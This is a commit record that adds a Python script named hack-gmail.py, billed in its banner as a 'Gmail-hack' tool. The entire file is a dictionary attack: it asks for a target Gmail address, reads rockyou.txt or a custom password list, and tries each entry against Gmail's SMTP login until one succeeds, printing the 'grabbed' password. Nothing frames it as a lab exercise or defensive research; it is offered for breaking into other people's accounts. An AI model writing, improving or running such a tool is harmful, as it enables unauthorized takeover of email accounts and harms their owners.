850fa67a62bfe8fa5e2be5ae500a68793c5686ef
mv$ <modathirhussain12@gmail.com>
2025-09-21 15:38:16 +0100

    Add files via upload

---
+++ code/hack-gmail.py
@@ -0,0 +1,68 @@
+import smtplib
+import sys
+import os
+from os import system
+
+def artwork():
+   return r"""
+##########################################################
+#                                                        #
+#                     \\\\                               #
+#                     |  @___oo                          #
+#           /\  /\   / (__,,,,|                          #
+#          ) /^\) ^\/ _)                Gmail-hack!      #
+#          )   /^\/   _)            tweaked by mv4z      #
+#          )   _ /  / _)                                 #
+#      /\  )/\/ ||  | )_)                                #
+#     <  >      |(,,) )__)                               #
+#      ||      /    \)___)\                              #
+#      | \____(      )___) )___                          #
+#      \______(_______;;; __;;;                          #
+#                                                        #
+##########################################################
+"""
+    
+def cls():
+ if os == "nt":    # windows is classified as "nt"
+    os.system("cls")
+
+cls()
+print(artwork())
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+
+smtpserver.ehlo()
+smtpserver.starttls()
+
+user = input("Enter The Target Gmail Address => ")
+
+print("\n")
+
+pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '1' to Add a custom password list\n => ")
+
+if pwd=='0':
+    passswfile="rockyou.txt"
+
+elif pwd=='1':
+    print("\n")
+    passswfile = input("Name The File Path (passlist) => ")
+
+else:
+    print("\n")
+    print("Invalid input!")
+    sys.exit(1)
+try:
+    passswfile = open(passswfile, "r")
+
+except Exception as e:
+    print(e)
+    sys.exit(1)
+
+for password in passswfile:
+    try:
+        smtpserver.login(user, password)
+
+        print("[+] Password Grabbed 🔥 %s" % password)
+        break
+
+    except smtplib.SMTPAuthenticationError:
+        print("[!] Pasword Failure ❌. %s " % password)
